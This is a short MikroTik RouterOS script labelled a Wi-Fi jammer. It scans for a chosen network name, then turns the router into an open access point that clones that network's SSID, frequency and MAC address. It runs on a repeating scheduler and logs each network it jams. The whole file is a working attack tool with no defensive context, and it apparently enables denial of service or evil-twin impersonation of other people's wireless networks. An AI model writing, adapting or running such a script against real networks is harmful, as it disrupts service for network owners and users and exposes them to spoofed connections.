#-------------------------------------------------------------------------------
# MikroTik RouterOS Wi-Fi Jammer
#-------------------------------------------------------------------------------

#-------------------------------------------------------------------------------
# Settings
#-------------------------------------------------------------------------------
:local TARGETSSID "SomeSSID"
:local WLANIFACE 0
:local SCANDATFILENAME "scan.dat"
:local SCANDURATION 5

#-------------------------------------------------------------------------------
# Jammer
#-------------------------------------------------------------------------------
/interface wireless reset-configuration $WLANIFACE
/interface wireless scan $WLANIFACE duration=$SCANDURATION save-file=$SCANDATFILENAME
:local text [/file get $SCANDATFILENAME contents]
:local textLen [:len $text]
:local startPos 0
:local endPos 0
:local line ""
:do {
  :set endPos [:find $text "\n" $endPos]
  :set line [:pick $text $startPos $endPos]
  :set startPos ($endPos + 1)
  :local data [:toarray $line]
  :local mac [:pick $data 0]
  :local ssid [:pick $data 1]
  :local freq [:pick [:pick $data 2] 0 [:find [:pick $data 2] "/"]]
  :if ($ssid="'" . $TARGETSSID . "'") do={
    /interface wireless security-profiles set 0 mode=none supplicant-identity=""
    /interface wireless set $WLANIFACE mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac
    /interface wireless enable $WLANIFACE
    :log info "Jammed: $TARGETSSID $freq $mac"
  }
} while ($startPos < $textLen)
/file remove $SCANDATFILENAME
/system scheduler set "wifi-jammer" interval=($SCANDURATION + 1 + [:pick [/system clock get time] 7])
